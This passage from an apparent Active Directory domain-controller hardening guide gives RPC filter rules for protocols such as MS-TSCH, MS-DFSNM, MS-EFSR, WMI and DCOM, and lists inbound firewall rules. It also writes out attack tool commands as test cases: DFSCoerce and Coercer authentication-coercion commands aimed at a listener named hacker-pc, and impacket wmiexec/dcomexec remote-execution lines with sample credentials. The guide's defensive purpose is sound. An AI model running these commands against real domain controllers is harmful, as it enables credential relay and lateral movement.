add rule layer=um actiontype=block filterkey=13518c11-e3d8-4f62-9461-eda11beb540a
add condition field=if_uuid matchtype=equal data=1FF70682-0A51-30E8-076D-740BE8CEE98B
add filter
```

Interface UUID: [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)

```txt
# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Net Schedule (SASec)
add rule layer=um actiontype=block filterkey=1c079a18-e91f-4698-9868-68a121490636
add condition field=if_uuid matchtype=equal data=378E52B0-C0A9-11CF-822D-00AA0051E40F
add filter
```

### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0

```shell
wevtutil.exe /r:contoso-dc qe System /c:1
```

Ability to clear security event logs remotely.

```txt
# Block [MS-EVEN6]: EventLog Remoting Protocol Version 6.0, Named pipe: \PIPE\eventlog
# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
add rule layer=um actiontype=block filterkey=dedffabf-db89-4177-be77-1954aa2c0b95
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=f6beaff7-1e19-4fbb-9f8f-b89e2018337c
add filter
```

### \[MS-EVEN\]: EventLog Remoting Protocol

TODO

Legacy proto, Uses only named pipes

```txt
# Block [MS-EVEN]: EventLog Remoting Protocol, Named pipe: \PIPE\eventlog
add rule layer=um actiontype=block filterkey=f7f68868-5f50-4cda-a18c-6a7a549652e7
add condition field=if_uuid matchtype=equal data=82273FDC-E32A-18C3-3F78-827929DC23EA
add filter
```

### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol

Restrict to Domain Admins

```shell
python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
```

```txt
# Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol, Named pipe: \PIPE\netdfs
# Limit access to Domain Admins only.
add rule layer=um actiontype=permit filterkey=43873c58-e130-4ffb-8858-d259a673a917
add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
add filter

# Block MS-DFSNM by default
add rule layer=um actiontype=block filterkey=0a239867-73db-45e6-b287-d006fe3c8b18
add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
add filter
```

### \[MS-RPRN\]: Print System Remote Protocol

https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print

TODO

```txt
# Block [MS-RPRN]: Print System Remote Protocol, Named pipe: \PIPE\spoolss
# This rule only blocks RPC over Named Pipes,
# while RPC over TCP is still allowed on Windows 11, version 22H2 and later versions of Windows.
add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
add filter
```

### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol

```shell
coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
```

```txt
# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\lsarpc
# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
add rule layer=um actiontype=permit filterkey=d71d00db-3eef-4935-bedf-20cf628abd9e
add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
add condition field=auth_type matchtype=equal data=16
add condition field=auth_level matchtype=equal data=6
add filter

# Block MS-EFSR over \PIPE\lsarpc by default
add rule layer=um actiontype=block filterkey=3a4cce27-a7fa-4248-b8b8-ef6439a2c0ff
add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
add filter

# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\efsrpc
# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
add rule layer=um actiontype=permit filterkey=c5cf8020-c83c-4803-9241-8c7f3b10171f
add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
add condition field=auth_type matchtype=equal data=16
add condition field=auth_level matchtype=equal data=6
add filter

# Block MS-EFSR over \PIPE\efsrpc by default
add rule layer=um actiontype=block filterkey=9ad23a91-085d-4f99-ae15-85e0ad801278
add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
add filter
```

### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol

TODO

```txt
# Block [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol, Named pipe: \PIPE\DNSSERVER
# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
add rule layer=um actiontype=block filterkey=50754fe4-aa2d-42ff-8196-e90ea8fd2527
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=50abc2a4-574d-40b3-9d66-ee4fd5fba076
add filter
```

### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol

```powershell
Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
```

```shell
impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
```

Solved using Defender ASR rules.

TODO: Test service creation using WMI

### DCOM

TODO: Block command execution over DCOM over named pipes (ShellWindows, ShellBrowserWindow, and MMC20 objects)

```shell
impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
```

TODO: Does it event work?

### \[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd

TODO: Block RDP-related protocols over named pipes?

### \[MS-RSP\]: Remote Shutdown Protocol

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074

UUID: d95afe70-a6d5-4259-822e-2c84da1ddb0d 
ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]

UUID: 76f226c3-ec14-4325-8a99-6a46348418af 
ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]

### Further Protocol Considerations

TODO: Firewall remote management?

### Additional Reading on RPC

- [MSRPC-To-ATT&CK](https://github.com/jsecurity101/MSRPC-to-ATTACK)
- [A Definitive Guide to the Remote Procedure Call (RPC) Filter](https://www.akamai.com/blog/security/guide-rpc-filter#using)
- [server22_rpc_servers_scrape.csv](https://github.com/akamai/akamai-security-research/blob/main/rpc_toolkit/rpc_interface_lists/server22_rpc_servers_scrape.csv)

## Inbound Firewall Rules Reference

### Microsoft's Guidelines

- [How to configure a firewall for Active Directory domains and trusts](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/config-firewall-for-ad-domains-and-trusts)
- [Service overview and network port requirements for Windows](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements)

TODO: Needs splitting, extending, and mapping to the default rules.

|Port|Service|
|---|---|
|123/UDP|W32Time|
|135/TCP|RPC Endpoint Mapper|
|464/TCP/UDP|Kerberos password change|
|49152-65535/TCP|RPC for LSA, SAM, NetLogon (*)|
|389/TCP/UDP|LDAP|
|636/TCP|LDAP SSL|
|3268/TCP|LDAP GC|
|3269/TCP|LDAP GC SSL|
|53/TCP/UDP|DNS|
|49152-65535/TCP|FRS RPC (*)|
|88/TCP/UDP|Kerberos|
|445/TCP|SMB (**)|
|49152-65535/TCP|DFSR RPC (*)|

### Client Traffic

#### Active Directory Domain Controller - W32Time (NTP-UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | W32Time-NTP-UDP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 123 |
| Program     | `%systemroot%\System32\svchost.exe` |
| Service     | `w32time` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow NTP traffic for the Windows Time service. [UDP 123] |


#### Active Directory Domain Controller (RPC-EPMAP)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-RPCEPMAP-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 135 |
| Program     | `%systemroot%\system32\svchost.exe` |
| Service     | `rpcss` |
| Description | Inbound rule for the RPCSS service to allow RPC/TCP traffic to the Active Directory Domain Controller service. |


#### Kerberos Key Distribution Center - PCR (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-Kerberos-Password-UDP-In |
| Group       | Kerberos Key Distribution Center |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 464 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Kerberos Key Distribution Center service to allow for password change requests. [UDP 464] |


#### Kerberos Key Distribution Center - PCR (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-Kerberos-Password-TCP-In |
| Group       | Kerberos Key Distribution Center |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 464 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Kerberos Key Distribution Center service to allow for password change requests. [TCP 464] |


#### Active Directory Domain Controller (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-RPC-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule to allow remote RPC/TCP access to the Active Directory Domain Controller service. |


#### Active Directory Domain Controller - LDAP (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-LDAP-UDP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 389 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow remote LDAP traffic. [UDP 389] |


#### Active Directory Domain Controller - LDAP (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-LDAP-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 389 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow remote LDAP traffic. [TCP 389] |


#### Active Directory Domain Controller - Secure LDAP (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-LDAPSEC-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 636 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow remote Secure LDAP traffic. [TCP 636] |


#### Active Directory Domain Controller - LDAP for Global Catalog (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-LDAPGC-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 3268 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow remote Global Catalog traffic. [TCP 3268] |


#### Active Directory Domain Controller - Secure LDAP for Global Catalog (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-LDAPGCSEC-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 3269 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow remote Secure Global Catalog traffic. [TCP 3269] |


#### DNS (UDP, Incoming)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | DNSSrv-DNS-UDP-In |
| Group       | DNS Service |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 53 |
| Program     | `%systemroot%\System32\dns.exe` |
| Service     | `dns` |
| Description | Inbound rule to allow remote UDP access to the DNS service. |


#### DNS (TCP, Incoming)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | DNSSrv-DNS-TCP-In |
| Group       | DNS Service |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 53 |
| Program     | `%systemroot%\System32\dns.exe` |
| Service     | `dns` |
| Description | Inbound rule to allow remote TCP access to the DNS service. |


#### Kerberos Key Distribution Center (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-Kerberos-TCP-In |
| Group       | Kerberos Key Distribution Center |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 88 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Kerberos Key Distribution Center service. [TCP 88] |


#### Kerberos Key Distribution Center (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-Kerberos-UDP-In |
| Group       | Kerberos Key Distribution Center |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 88 |
| Program     | `%systemroot%\System32\lsass.exe` |
| Description | Inbound rule for the Kerberos Key Distribution Center service. [UDP 88] |


#### Active Directory Domain Controller - SAM/LSA (NP-UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-NP-UDP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 445 |
| Program     | `System` |
| Description | Inbound rule for the Active Directory Domain Controller service to be remotely managed over Named Pipes. [UDP 445] |


#### Active Directory Domain Controller - SAM/LSA (NP-TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-NP-TCP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 445 |
| Program     | `System` |
| Description | Inbound rule for the Active Directory Domain Controller service to be remotely managed over Named Pipes. [TCP 445] |


#### Active Directory Domain Controller - Echo Request (ICMPv4-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-ICMP4-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | ICMPv4 |
| ICMP Type   | 8 |
| Program     | `System` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow Echo requests (ping). |


#### Active Directory Domain Controller - Echo Request (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-ICMP6-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 128 |
| Program     | `System` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow Echo requests (ping). |


#### Active Directory Domain Controller - NetBIOS name resolution (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADDS-NB-Datagram-UDP-In |
| Group       | Active Directory Domain Services |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 138 |
| Program     | `System` |
| Description | Inbound rule for the Active Directory Domain Controller service to allow NetBIOS name resolution. [UDP 138] |


#### Core Networking - Destination Unreachable (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-DU-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 1 |
| Program     | `System` |
| Description | Destination Unreachable error messages are sent from any node that a packet traverses which is unable to forward the packet for any reason except congestion. |


#### Core Networking - Destination Unreachable Fragmentation Needed (ICMPv4-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP4-DUFRAG-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv4 |
| ICMP Type   | 3:4 |
| Program     | `System` |
| Description | Destination Unreachable Fragmentation Needed error messages are sent from any node that a packet traverses which is unable to forward the packet because fragmentation was needed and the don't fragment bit was set. |


#### Core Networking - Neighbor Discovery Advertisement (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-NDA-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 136 |
| Program     | `System` |
| Description | Neighbor Discovery Advertisement messages are sent by nodes to notify other nodes of link-layer address changes or in response to a Neighbor Discovery Solicitation request. |


#### Core Networking - Neighbor Discovery Solicitation (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-NDS-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 135 |
| Program     | `System` |
| Description | Neighbor Discovery Solicitations are sent by nodes to discover the link-layer address of another on-link IPv6 node. |


#### Core Networking - Packet Too Big (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-PTB-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 2 |
| Program     | `System` |
| Description | Packet Too Big error messages are sent from any node that a packet traverses which is unable to forward the packet because the packet is too large for the next link. |


#### Core Networking - Parameter Problem (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-PP-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 4 |
| Program     | `System` |
| Description | Parameter Problem error messages are sent by nodes as a result of incorrectly generated packets. |


#### Core Networking - Time Exceeded (ICMPv6-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | CoreNet-ICMP6-TE-In |
| Group       | Core Networking |
| Direction   | Inbound |
| Protocol    | ICMPv6 |
| ICMP Type   | 3 |
| Program     | `System` |
| Description | Time Exceeded error messages are generated from any node that a packet traverses if the Hop Limit value is decremented to zero at any point on the path. |


#### Windows Internet Naming Service (WINS) (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WINS-Service-In-TCP |
| Group       | Windows Internet Naming Service (WINS) |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 42 |
| Program     | `%SystemRoot%\System32\wins.exe` |
| Service     | `WINS` |
| Description | Inbound rule for the Windows Internet Naming Service to allow WINS requests. [TCP 42] |


#### Windows Internet Naming Service (WINS) (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WINS-Service-In-UDP |
| Group       | Windows Internet Naming Service (WINS) |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 42 |
| Program     | `%SystemRoot%\System32\wins.exe` |
| Service     | `WINS` |
| Description | Inbound rule for the Windows Internet Naming Service to allow WINS requests. [UDP 42] |


#### File and Printer Sharing (NB-Name-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | FPS-NB_Name-In-UDP |
| Group       | File and Printer Sharing |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 137 |
| Program     | `System` |
| Description | Inbound rule for File and Printer Sharing to allow NetBIOS Name Resolution. [UDP 137] |


#### File and Printer Sharing (NB-Session-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | FPS-NB_Session-In-TCP |
| Group       | File and Printer Sharing |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 139 |
| Program     | `System` |
| Description | Inbound rule for File and Printer Sharing to allow NetBIOS Session Service connections. [TCP 139] |


### Management Traffic

#### Active Directory Web Services (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ADWS-TCP-In |
| Group       | Active Directory Web Services |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 9389 |
| Program     | `%systemroot%\ADWS\Microsoft.ActiveDirectory.WebServices.exe` |
| Service     | `adws` |
| Description | Inbound rule for the Active Directory Web Services. [TCP] |


#### Windows Remote Management (HTTP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WINRM-HTTP-In-TCP-PUBLIC |
| Group       | Windows Remote Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 5985 |
| Program     | `System` |
| Description | Inbound rule for Windows Remote Management via WS-Management. [TCP 5985] |


#### Windows Remote Management (HTTPS-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WINRM-HTTPS-In-TCP-PUBLIC |
| Group       | Windows Remote Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 5986 |
| Program     | `System` |
| Description | Inbound rule for Windows Remote Management via WS-Management. [TCP 5986] |


#### Windows Management Instrumentation (WMI-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WMI-WINMGMT-In-TCP |
| Group       | Windows Management Instrumentation (WMI) |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | Any |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `winmgmt` |
| Description | Inbound rule to allow WMI traffic for remote Windows Management Instrumentation. [TCP] |


#### Remote Desktop - User Mode (UDP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteDesktop-UserMode-In-UDP |
| Group       | Remote Desktop |
| Direction   | Inbound |
| Protocol    | UDP |
| Port        | 3389 |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `termservice` |
| Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [UDP 3389] |


#### Remote Desktop - User Mode (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteDesktop-UserMode-In-TCP |
| Group       | Remote Desktop |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 3389 |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `termservice` |
| Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] |


#### OpenSSH SSH Server (sshd)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | OpenSSH-Server-In-TCP |
| Group       | OpenSSH Server |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | 22 |
| Program     | `%SystemRoot%\system32\OpenSSH\sshd.exe` |
| Description | Inbound rule for OpenSSH SSH Server (sshd) |


#### DFS Management (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | DfsMgmt-In-TCP |
| Group       | DFS Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%systemroot%\system32\dfsfrsHost.exe` |
| Description | Inbound rule for DFS Management to allow the DFS Management service to be remotely managed via DCOM. |


#### RPC (TCP, Incoming)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | DNSSrv-RPC-TCP-In |
| Group       | DNS Service |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%systemroot%\System32\dns.exe` |
| Service     | `dns` |
| Description | Inbound rule to allow remote RPC/TCP access to the DNS service. |


#### Windows Backup (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WindowsServerBackup-wbengine-In-TCP-NoScope |
| Group       | Windows Backup |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%systemroot%\system32\wbengine.exe` |
| Service     | `wbengine` |
| Description | Inbound rule for the Windows Backup Service to be remotely managed via RPC/TCP |


#### Performance Logs and Alerts (TCP-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | PerfLogsAlerts-PLASrv-In-TCP-NoScope |
| Group       | Performance Logs and Alerts |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | Any |
| Program     | `%systemroot%\system32\plasrv.exe` |
| Description | Inbound rule for Performance Logs and Alerts traffic. [TCP-In] |


#### COM+ Remote Administration (DCOM-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | ComPlusRemoteAdministration-DCOM-In |
| Group       | COM+ Remote Administration |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%systemroot%\system32\dllhost.exe` |
| Service     | `COMSysApp` |
| Description | Inbound rule to allow DCOM traffic to the COM+ System Application for remote administration. |


#### Remote Event Log Management (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteEventLogSvc-In-TCP |
| Group       | Remote Event Log Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `Eventlog` |
| Description | Inbound rule for the local Event Log service to be remotely managed via RPC/TCP. |


This rule is governed by the [EnableEventLogManagement](#enableeventlogmanagement) setting.

#### Remote Scheduled Tasks Management (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteTask-In-TCP |
| Group       | Remote Scheduled Tasks Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `schedule` |
| Description | Inbound rule for the Task Scheduler service to be remotely managed via RPC/TCP. |


#### Remote Service Management (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteSvcAdmin-In-TCP |
| Group       | Remote Service Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\services.exe` |
| Description | Inbound rule for the local Service Control Manager to be remotely managed via RPC/TCP. |


#### Remote Volume Management - Virtual Disk Service (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RVM-VDS-In-TCP |
| Group       | Remote Volume Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\vds.exe` |
| Service     | `vds` |
| Description | Inbound rule for the Remote Volume Management - Virtual Disk Service to be remotely managed via RPC/TCP. |


#### Remote Volume Management - Virtual Disk Service Loader (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RVM-VDSLDR-In-TCP |
| Group       | Remote Volume Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\vdsldr.exe` |
| Description | Inbound rule for the Remote Volume Management - Virtual Disk Service Loader to be remotely managed via RPC/TCP. |


#### Windows Internet Naming Service (WINS) - Remote Management (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | WINS-Service-In-RPC |
| Group       | Windows Internet Naming Service (WINS) - Remote Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\System32\wins.exe` |
| Service     | `WINS` |
| Description | Inbound rule for the Windows Internet Naming Service to allow remote management via RPC/TCP. |


#### Windows Defender Firewall Remote Management (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | RemoteFwAdmin-In-TCP |
| Group       | Windows Defender Firewall Remote Management |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\svchost.exe` |
| Service     | `policyagent` |
| Description | Inbound rule for the Windows Defender Firewall to be remotely managed via RPC/TCP. |


### DC Replication Traffic

#### DFS Replication (RPC-In)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | DFSR-DFSRSvc-In-TCP |
| Group       | DFS Replication |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\dfsrs.exe` |
| Service     | `Dfsr` |
| Description | Inbound rule to allow DFS Replication RPC traffic. |


#### File Replication (RPC)

| Property    | Value |
|-------------|---------------------------------------------------|
| Name        | NTFRS-NTFRSSvc-In-TCP |
| Group       | File Replication |
| Direction   | Inbound |
| Protocol    | TCP |
| Port        | RPC |
| Program     | `%SystemRoot%\system32\NTFRS.exe` |
| Service     | `NTFRS` |
| Description | Inbound rule to allow File Replication RPC traffic. |

